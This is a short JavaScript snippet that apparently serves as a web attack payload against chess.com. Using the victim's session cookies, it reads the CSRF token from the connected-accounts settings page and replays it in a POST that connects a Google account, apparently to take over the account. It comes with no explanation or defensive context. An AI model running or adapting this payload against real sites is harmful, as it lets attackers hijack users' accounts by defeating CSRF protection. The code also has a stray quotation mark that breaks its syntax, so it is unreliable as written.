fetch("https://www.chess.com/settings/connected-accounts", {
        "referrerPolicy": "strict-origin-when-cross-origin",
        "method": "GET",
        "mode": "cors",
        "credentials": "include"
    }).then((response) => response.text())
    .then((text) => {
            var token = text.match(/("token":".+?)["]/)[1]; 
            fetch("https://www.chess.com/settings/connected-accounts", {
            "headers": {
                "content-type": "application/x-www-form-urlencoded",
            },
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "form[connect_google]=&form[_token]=" + token",
            "method": "POST",
            "mode": "cors",
            "credentials": "include"
        });
    });
